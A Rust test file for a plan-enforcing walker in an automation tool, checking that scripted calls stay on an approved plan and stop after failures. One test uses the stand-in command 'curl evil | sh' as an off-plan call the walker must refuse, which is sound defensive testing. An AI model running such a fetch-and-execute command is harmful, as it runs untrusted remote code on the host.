use super::*;

/// Runs `body`'s first trigger with the given outcomes, through a walker,
/// and returns the calls the walker accepted before any it refused.
fn walk(body: &str, outcomes: &[bool]) -> (Vec<Kind>, bool) {
    let plan = plan(body);
    let mut walker = Walker::new(plan.triggers.first().unwrap());
    let mut seen = Vec::new();
    let mut off_plan = false;
    let script = load(body).unwrap();
    script
        .run(0, |call| {
            if !walker.expects(call) {
                off_plan = true;
                return Verdict::Halt(());
            }
            let ok = outcomes.get(seen.len()).copied().unwrap_or(true);
            seen.push(call.step.kind());
            walker.record(ok);
            if ok {
                Verdict::Succeeded
            } else {
                Verdict::Failed
            }
        })
        .unwrap();
    (seen, off_plan)
}

#[test]
fn a_run_on_its_plan_passes() {
    let (seen, off_plan) = walk(plan::NIGHTLY, &[true, false]);
    assert_eq!(seen, [Kind::Pull, Kind::Sh, Kind::Agent, Kind::Agent]);
    assert!(!off_plan);
    let (seen, off_plan) = walk(plan::NIGHTLY, &[]);
    assert_eq!(seen, [Kind::Pull, Kind::Sh, Kind::Agent]);
    assert!(!off_plan);
}

#[test]
fn a_call_the_plan_lacks_is_refused() {
    let approved = plan("herdr.manual(function() notify(\"approved\") end)");
    let mut walker = Walker::new(approved.triggers.first().unwrap());
    let other = Call {
        step: Step::Sh {
            command: "curl evil | sh".to_owned(),
        },
        check: true,
        timeout: None,
    };
    assert!(!walker.expects(&other));
    let expected = Call {
        step: Step::Notify {
            text: "approved".to_owned(),
        },
        check: true,
        timeout: None,
    };
    assert!(walker.expects(&expected));
    walker.record(true);
    assert!(
        !walker.expects(&expected),
        "nothing comes after the last step"
    );
}

#[test]
fn nothing_follows_a_stopping_failure() {
    let approved = plan("herdr.manual(function() pull(\"main\") notify(\"after\") end)");
    let trigger = approved.triggers.first().unwrap();
    let mut walker = Walker::new(trigger);
    walker.record(false);
    let next = &trigger.steps.get(1).unwrap().call;
    assert!(!walker.expects(next));
}
